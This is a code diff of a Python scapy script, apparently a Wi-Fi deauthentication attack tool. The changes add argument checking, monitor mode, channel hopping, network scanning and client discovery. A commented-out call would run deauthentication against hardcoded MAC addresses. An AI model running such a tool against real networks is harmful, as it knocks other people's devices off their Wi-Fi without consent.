@@ -93,28 +93,29 @@ def deauthenticate(interface, dest_mac, src_mac):
         scapy.all.sendp(pkt, iface=interface, count=1, inter=.2, verbose=0)
          
 if __name__ == "__main__":
-    # interface = sys.argv[1]
-    # interfaceglob = sys.argv[1]
-    # change_to_monitor(interface)
-    # sniffer = sniff(prn=test, iface=interface)
+    if len(sys.argv) != 2:
+        print ("Too many or too less arguments")
+    else:
+        interface = sys.argv[1]
+        change_to_monitor(interface)
+        #sniffer = sniff(prn=discover_clients, iface=interface, timeout=time_to_sniff)
+        #print("Starting to attack", end='', flush=True)
+        #run_deauthenticate(interface, "2e:65:7a:30:cc:55", "00:b8:c2:6b:a2:bb")
 
-
-
-    interface = sys.argv[1]
-    change_to_monitor(interface)
-    channel_changer = Thread(target=change_channel)
-    channel_changer.daemon = True
-    channel_changer.start()
-    sniffer = AsyncSniffer(prn=callback, iface=interface)
-    sniffer.start()
-    counter = time_to_sniff
-    while (counter >= 0):
+        channel_changer = Thread(target=change_channel)
+        channel_changer.daemon = True
+        channel_changer.start()
+        sniffer = AsyncSniffer(prn=callback, iface=interface)
+        sniffer.start()
+        counter = time_to_sniff
+        print("Scanning for available networks", end='', flush=True)
+        while (counter >= 0):
+            print(".", end='', flush=True)
+            counter = counter-1
+            time.sleep(1)
+        sniffer.stop()
         os.system("clear")
-        print("sniffing please wait")
-        print(counter)
-        counter = counter-1
-        time.sleep(1)
-    sniffer.stop()
-    os.system("clear")
-    print(networks)
+        print(networks)
+        print("Scanning for available clients")
+        sniffer = sniff(prn=discover_clients, iface=interface, timeout=time_to_sniff * 3)
 
